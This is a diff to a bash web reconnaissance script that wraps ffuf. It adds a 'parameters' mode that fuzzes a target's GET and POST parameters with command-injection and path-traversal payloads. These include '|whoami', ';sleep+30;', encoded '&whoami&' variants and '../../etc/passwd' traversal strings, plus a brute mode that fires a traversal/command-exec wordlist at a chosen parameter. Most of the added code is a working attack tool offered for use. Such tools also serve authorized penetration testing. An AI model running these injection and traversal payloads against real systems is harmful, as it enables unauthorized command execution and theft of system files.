@@ -3,7 +3,7 @@
 ##############################
 # */ script author: nowak */ #
 # */  the recon is a art  */ # /* https://discord.gg/PePM2NR5zS ~/
-#    */   v1.2.1-dev   /*    # /~ https://github.com/nowak0x01 */
+#    */   v1.2.2-dev   /*    # /~ https://github.com/nowak0x01 */
 # $/  hackingforce family #/ #
 ##############################
 
@@ -19,6 +19,7 @@ $0 ({program}) ({options})
 	$0 vhosts +options+
 	$0 subdomains +options+
 	$0 web-tecnology +options+
+	$0 parameters +options+
 \n"
 
 __defaultPATH="$PATH"
@@ -27,7 +28,7 @@ export PATH="/opt:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:$
 verify()
 {
 	local check=$1
-	
+
 	if [ "$(type -p $check)" = "" ];then
 
 		printf "\n\e[1;31mERROR:\e[1;37m $check command \e[0mnot found in\e[1;37m $PATH \e[0m\n\n"
@@ -70,7 +71,7 @@ case "$1" in
 			cut -d'.' -f1 $3 | sort -u > /var/tmp/files-wordlist.hfscan
 			printf "\n\e[1;37m{#} TARGET:\e[1;32m $4 \e[1;37m| WORDLIST:\e[1;32m /var/tmp/files-wordlist.hfscan \e[1;37m| METHOD:\e[1;32m (FILES - CHANGED) #}\e[0m\n\n"
 			ffuf -ic -w /var/tmp/files-wordlist.hfscan -u $4 -H "User-Agent: $UAGENT" -c -e "$EXTENSIONS" -t $THREADS --timeout 16 -mc all -ac
-			
+
 		fi
 
 		;;
@@ -80,7 +81,7 @@ case "$1" in
 		verify nmap
 
 		if [ "$3" == "" ];then
-		
+
 			printf "\n$0 %s [ctf/world] [target]\n\n" "$1"
 			export PATH="$__defaultPATH"
 			exit 1
@@ -336,6 +337,155 @@ case "$1" in
 
 		;;
 
+
+		'parameters'|'PARAMETERS'|'params'|'PARAMS')
+
+			verify ffuf
+
+			if [ "$2" == "" ];then
+
+				printf "\n$0 $1 [DISCOVERY/BRUTE]\n\n"
+				export PATH="$__defaultPATH"
+				exit 1
+
+			elif [[ "$2" == "DISCOVERY" || "$2" == "discovery" ]];then
+
+				if [ $# -ne 5 ];then
+
+					printf "\n$0 $1 $2 [GET/POST] ./parameters-list.txt https://hackingforce.com.br/upload.php\n
+{example}
+
+	$0 $1 $2 GET ./parameters-list.txt https://hackingforce.com.br/upload.php
+\n"
+					export PATH="$__defaultPATH"
+					exit 1
+				else
+
+					THREADS='110'
+					UAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60'
+
+					function GET_REQ()
+					{
+
+						if [ "$1" == "+%26+sleep+30+%26+" ]
+						then
+							printf "\n\e[1;37m{#} TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=+%%26+sleep+30+%%26+ \e[1;37m| METHOD:\e[1;32m GET \e[1;37m{#}\e[0m\n\n"
+							
+						elif [ "$1" == "+%26+whoami+%26+" ]
+						then
+							printf "\n\e[1;37m{#} TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=+%%26+whoami+%%26+ \e[1;37m| METHOD:\e[1;32m GET \e[1;37m{#}\e[0m\n\n"
+							
+						else
+							printf "\n\e[1;37m{#} TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=$1 \e[1;37m| METHOD:\e[1;32m GET \e[1;37m{#}\e[0m\n\n"
+						fi
+
+						ffuf -mt '<8000' -ic -w $2 -u $3?FUZZ=$1 -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+
+					}
+
+					function POST_REQ()
+					{
+
+
+						if [ "$1" == "+%26+sleep+30+%26+" ]
+						then
+							printf "\n\e[1;37m{#} TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=+%%26+sleep+30+%%26+ \e[1;37m| METHOD:\e[1;32m POST \e[1;37m{#}\e[0m\n\n"
+							
+						elif [ "$1" == "+%26+whoami+%26+" ]
+						then
+							printf "\n\e[1;37m{#} TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=+%%26+whoami+%%26+ \e[1;37m| METHOD:\e[1;32m POST \e[1;37m{#}\e[0m\n\n"
+							
+						else
+							printf "\n\e[1;37m{#} TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=$1 \e[1;37m| METHOD:\e[1;32m POST \e[1;37m{#}\e[0m\n\n"
+						fi
+
+						ffuf -mt '<8000' -X POST -ic -w $2 -u $3 -d "FUZZ=$1" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+
+					}
+
+
+					if [[ "$3" == "GET" || "$3" == "get" ]];then
+
+						GET_REQ 'whoami' $4 $5
+						GET_REQ "|whoami" $4 $5
+						GET_REQ "+%26+whoami+%26+" $4 $5
+						GET_REQ ";whoami;" $4 $5
+						GET_REQ "&whoami&" $4 $5
+						GET_REQ "sleep+30" $4 $5
+						GET_REQ ";sleep+30;" $4 $5
+						GET_REQ "&sleep+30&" $4 $5
+						GET_REQ "+%26+sleep+30+%26+" $4 $5
+						GET_REQ '1' $4 $5
+						GET_REQ '0' $4 $5
+						GET_REQ 'true' $4 $5
+						GET_REQ 'false' $4 $5
+						GET_REQ '/etc/passwd' $4 $5
+						GET_REQ '/.././.././.././.././.././.././.././.././../etc/passwd' $4 $5
+
+					elif [[ "$3" == "POST" || "$3" == "post" ]];then
+
+
+						POST_REQ 'whoami' $4 $5
+						POST_REQ "|whoami" $4 $5
+						POST_REQ "+%26+whoami+%26+" $4 $5
+						POST_REQ ";whoami;" $4 $5
+						POST_REQ "&whoami&" $4 $5
+						POST_REQ "sleep+30" $4 $5
+						POST_REQ ";sleep+30;" $4 $5
+						POST_REQ "&sleep+30&" $4 $5
+						POST_REQ "+%26+sleep+30+%26+" $4 $5
+						POST_REQ '1' $4 $5
+						POST_REQ '0' $4 $5
+						POST_REQ 'true' $4 $5
+						POST_REQ 'false' $4 $5
+						POST_REQ '/etc/passwd' $4 $5
+						POST_REQ '/.././.././.././.././.././.././.././.././../etc/passwd' $4 $5
+
+					fi
+
+				fi
+
+
+			elif [[ "$2" == "BRUTE" || "$2" == "brute" ]];then
+
+				if [ $# -ne 6 ];then
+
+					printf "\n$0 $1 $2 [GET/POST] [PARAMETER] ./pathTransversal-CommandExec-list.txt https://hackingforce.com.br/dev.php\n
+{example}
+
+	$0 $1 $2 POST 'img' ./pathTransversal-CommandExec-list.txt https://hackingforce.com.br/dev.php
+\n"
+					export PATH="$__defaultPATH"
+					exit 1
+
+				else
+
+					THREADS='110'
+					UAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60'
+
+					if [[ "$3" == "GET" || "$3" == "get" ]];then
+
+						printf "\n\e[1;37m{#} TARGET:\e[1;32m $6 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m GET \e[1;37m{#}\e[0m\n\n"
+						ffuf -mt '<8000' -ic -w $5 -u $6?$4=FUZZ -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+
+					elif [[ "$3" == "POST" || "$3" == "post" ]];then
+
+						printf "\n\e[1;37m{#} TARGET:\e[1;32m $6 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m POST \e[1;37m{#}\e[0m\n\n"
+						ffuf -X POST -mt '<8000' -ic -w $5 -u $6 -d "$4=FUZZ" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+
+					fi
+
+				fi
+
+			else
+
+				printf "\n\e[1;31mERROR:\e[1;37m only DISCOVERY or BRUTE \e[0m\n\n"
+				export PATH="$__defaultPATH"
+				exit 1
+
+			fi
+
+			;;
 
 	*)
 		printf "$HELP"
